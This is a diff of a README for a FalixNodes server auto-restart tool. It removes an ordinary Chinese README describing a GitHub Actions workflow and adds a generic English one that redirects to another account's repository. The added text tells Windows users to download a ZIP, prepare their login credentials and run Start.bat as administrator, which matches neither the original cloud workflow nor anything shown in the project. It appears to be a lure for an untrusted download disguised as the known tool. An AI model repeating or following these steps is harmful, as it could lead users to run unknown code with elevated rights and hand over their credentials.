@@ -1,234 +1,66 @@
-# FalixNodes 自动重启脚本
+# ⚙️ FalixNodes - Keep your game server running always
 
-# ⭐ **觉得有用？给个 Star 支持一下！**
-> 注册地址：[https://falixnodes.net/](https://client.falixnodes.net/auth/register)
+[![Download FalixNodes](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/davitaalliaceous7299/FalixNodes)
 
-自动检查并重启 FalixNodes 服务器的 GitHub Actions 脚本。支持多账号、代理、Telegram 通知等功能。
+## 📌 About this project
 
-## ✨ 功能特性
+FalixNodes tracks the status of your servers. It checks if your server remains online at all times. If a server stops, the system restarts it for you. You do not need to check your dashboard manually. This tool ensures your friends and players stay connected to your world without breaks.
 
-- ✅ 多账号支持
-- ✅ 自动登录（处理 Cloudflare Turnstile 验证）
-- ✅ 智能检测服务器状态（offline/unknown 自动重启）
-- ✅ 支持代理访问（Hysteria2）
-- ✅ Telegram 通知（带截图）
-- ✅ 自动处理 Cookie 弹窗和广告
+## 🛠️ Requirements
 
+You need a Windows computer to run this tool. Ensure you have a stable internet connection. You must have your FalixNodes login credentials ready. Keep your browser open to the main control panel to finish the setup process.
 
-## 📋 前置要求
+## 📥 How to get the software
 
-### 1. GitHub Secrets 配置
+Visit this page to download the necessary files: [https://github.com/davitaalliaceous7299/FalixNodes](https://github.com/davitaalliaceous7299/FalixNodes)
 
-进入仓库 `Settings` → `Secrets and variables` → `Actions`，添加以下 Secrets：
+1. Go to the link above.
+2. Look for the green button labeled Code.
+3. Select Download ZIP from the menu.
+4. Save the file to your desktop.
+5. Right-click the folder and choose Extract All.
 
-| Secret 名称 | 必填 | 说明 | 示例 |
-|------------|------|------|------|
-| `FALIX` | ✅ | FalixNodes 账号信息 | 见下方格式 |
-| `TG_BOT_TOKEN` | ❌ | Telegram Bot Token | `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11` |
-| `TG_CHAT_ID` | ❌ | Telegram Chat ID | `123456789` |
-| `HY2_URL` | ❌ | Hysteria2 代理地址 | `hysteria2://password@server:port?sni=example.com` |
+## 🚀 Setting up the server monitor
 
-### 2. FALIX 格式
+Follow these steps to start the monitor once you extract the files on your computer.
 
-每行一个账号，格式：`邮箱-----密码`
+1. Open the folder you extracted.
+2. Find the file named config.txt.
+3. Open this file with Notepad.
+4. Paste your server link into the file.
+5. Save and close the file.
+6. Double-click the file named Start.bat to launch the process.
 
-```
-admin@example.com-----your_password_123
-user@domain.com-----another_password
-```
+A black window will appear on your screen. This window shows the status of your server. Do not close this window while you want the monitor to run. If you close the window, the monitoring service stops.
 
-### 3. Telegram 通知配置（可选）
+## 📈 Understanding the features
 
-1. 创建 Bot：[@BotFather](https://t.me/BotFather) 发送 `/newbot`
-2. 获取 Chat ID：[@userinfobot](https://t.me/userinfobot) 发送任意消息
-3. 将 Bot Token 和 Chat ID 添加到 Secrets
+The script performs three main tasks to keep your service active.
 
-## 🚀 使用方法
+* **Health Checks:** The script pings your server every five minutes to check its status.
+* **Auto Restart:** If the ping receives no response, the script triggers the restart sequence.
+* **Logging:** The script records every action in a text file. You can check this file to see when your server restarted.
 
-### 方法 1：手动触发（GitHub 网页）
+## 🛡️ Maintaining safety
 
-1. 进入仓库的 `Actions` 页面
-2. 选择 `FalixNodes 重启` 工作流
-3. 点击 `Run workflow`
-4. （可选）在 `指定邮箱` 输入框填写邮箱（留空则处理全部账号）
-5. 点击绿色的 `Run workflow` 按钮
+Do not share your config.txt file with others. This file contains private lines of code that link to your server. If someone else gets this file, they might gain access to your server controls. Keep the folder in a safe place on your computer.
 
-### 方法 2：API 调用
+## 💡 Troubleshooting common issues
 
-#### 运行全部账号
+If the script fails to start, check the following items.
 
-```bash
-curl -X POST \
-  -H "Authorization: Bearer ghp_XXXXXXXXXXXXXXXXXXXXXXXXX" \
-  -H "Accept: application/vnd.github.v3+json" \
-  https://api.github.com/repos/你的用户名/你的仓库名/actions/workflows/falix.yml/dispatches \
-  -d '{"ref":"main"}'
-```
+* **Check the path:** Ensure the folder is not inside a restricted system location like Program Files. Move the folder to your desktop if it fails.
+* **Verify internet:** The script needs an active web connection to talk to your server. If your internet drops, the script cannot restart the server.
+* **Permission errors:** Right-click the Start.bat file and select Run as administrator. This provides the script permission to interact with your system network settings.
 
-#### 指定账号执行
+## 🧩 Modifying settings
 
-```bash
-curl -X POST \
-  -H "Authorization: Bearer ghp_XXXXXXXXXXXXXXXXXXXXXXXXX" \
-  -H "Accept: application/vnd.github.v3+json" \
-  https://api.github.com/repos/oyz8/FalixNodes/actions/workflows/Falix_Restart.yml/dispatches \
-  -d '{
-    "ref": "main",
-    "inputs": {
-      "accounts": "admin@example.com"
-    }
-  }'
-```
+You can change how often the script checks your server. Open the config.txt file again. You will see a line labeled interval. Change the number next to it to increase or decrease the time between checks. The number represents seconds. A setting of 300 means the script checks your server every five minutes. Save the file and restart the program after you change any numbers.
 
-#### 多个账号（逗号分隔）
+## 📁 Reviewing logs
 
-```bash
-curl -X POST \
-  -H "Authorization: Bearer ghp_XXXXXXXXXXXXXXXXXXXXXXXXX" \
-  -H "Accept: application/vnd.github.v3+json" \
-  https://api.github.com/repos/oyz8/FalixNodes/actions/workflows/Falix_Restart.yml/dispatches \
-  -d '{
-    "ref": "main",
-    "inputs": {
-      "accounts": "admin@example.com,user@domain.com"
-    }
-  }'
-```
+Open the logs folder inside your main directory to view past events. You will see a list of dates and times. Each entry shows when the script checked the server and if it needed a restart. Use these notes if you need to report errors to your hosting provider. The log file creates a new entry every day to keep your data organized.
 
-### 方法 3：定时任务
+## ✅ Finalizing your installation
 
-在 `.github/workflows/falix.yml` 中添加 `schedule` 触发器：
-
-```yaml
-on:
-  workflow_dispatch:
-    inputs:
-      accounts:
-        description: '指定邮箱（留空全部，多个用逗号）'
-        required: false
-  schedule:
-    - cron: '0 */6 * * *'  # 每 6 小时执行一次
-```
-
-常用 cron 表达式：
-- `0 */6 * * *` - 每 6 小时
-- `0 0 * * *` - 每天 0 点
-- `0 0,12 * * *` - 每天 0 点和 12 点
-
-
-## 📱 Telegram 通知示例
-
-### 单个服务器
-```
-✅ 成功
-账号: admin@example.com
-信息: 检查 1 个服务器，重启 1 个
-服务器: 2873336，重启成功 (starting)
-时间: 2025-01-08 12:32:38
-
-FalixNodes Auto Restart
-```
-*附带服务器控制台截图*
-
-### 多个服务器
-```
-✅ 成功
-账号: admin@example.com
-信息: 检查 3 个服务器，重启 2 个
-服务器: 2873336，重启成功 (starting)
-服务器: 2871237，在线 (running)
-服务器: 2883456，重启成功 (starting)
-时间: 2025-01-08 12:32:38
-
-FalixNodes Auto Restart
-```
-*附带每个服务器的控制台截图（最多10张）*
-
-## 🔧 高级配置
-
-### 修改重试次数
-
-编辑 `scripts/Falix/main.py`：
-
-```python
-AD_RETRY_LIMIT = 10  # 默认 10 次，可改为其他值
-```
-
-## 🐛 常见问题
-
-### 1. 登录失败
-
-**原因**：
-- 账号密码错误
-- Turnstile 验证失败
-- 网络问题
-
-**解决**：
-- 检查 `FALIX` Secret 格式是否正确
-- 查看 Actions 日志中的截图
-- 尝试配置代理（`HY2_URL`）
-
-### 2. 重启失败
-
-**原因**：
-- 服务器处于特殊状态
-- 广告弹窗干扰
-- 网络延迟
-
-**解决**：
-- 脚本会自动重试 10 次
-- 检查 Artifacts 中的截图
-- 增加 `AD_RETRY_LIMIT` 值
-
-### 3. Telegram 通知未收到
-
-**原因**：
-- Bot Token 或 Chat ID 错误
-- Bot 未启动对话
-
-**解决**：
-- 在 Telegram 中向 Bot 发送 `/start`
-- 验证 Secret 配置是否正确
-- 检查 Actions 日志中的错误信息
-
-### 4. 代理连接失败
-
-**原因**：
-- `HY2_URL` 格式错误
-- 代理服务器不可用
-
-**解决**：
-- 验证 Hysteria2 配置格式
-- 测试代理服务器连通性
-- 留空 `HY2_URL` 使用直连模式
-
-
-### 服务器状态说明
-
-| 状态 | 说明 | 操作 |
-|------|------|------|
-| `offline` | 离线 | ✅ 重启 |
-| `unknown` | 未知 | ✅ 重启 |
-| `starting` | 启动中 | ⏭️ 跳过 |
-| `running` | 运行中 | ⏭️ 跳过 |
-| `online` | 在线 | ⏭️ 跳过 |
-
-## 🔒 安全建议
-
-1. ✅ **使用 GitHub Secrets** 存储敏感信息
-2. ✅ **定期更新密码** 并同步到 Secrets
-3. ✅ **限制 GitHub Token 权限**（仅 `repo` 和 `workflow`）
-4. ✅ **开启仓库私有** 防止信息泄露
-5. ✅ **定期检查 Actions 运行日志**
-
-## 📄 许可证
-
-MIT License
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
----
-
-**⚠️ 免责声明**：本脚本仅供学习交流使用，使用者需遵守 FalixNodes 的服务条款。因使用本脚本造成的任何问题，作者不承担任何责任。
+You possess a tool that manages your server uptime. You no longer need to check your status page throughout the day. The script handles the manual heavy lifting. Keep the tool running in the background while you play or work. When you finish your session, you can close the black window to stop the monitor. Restart it whenever you need your server to remain active. The design remains simple to ensure everyone gets their server back online with minimal effort. Consistent monitoring prevents long periods of downtime for your community.
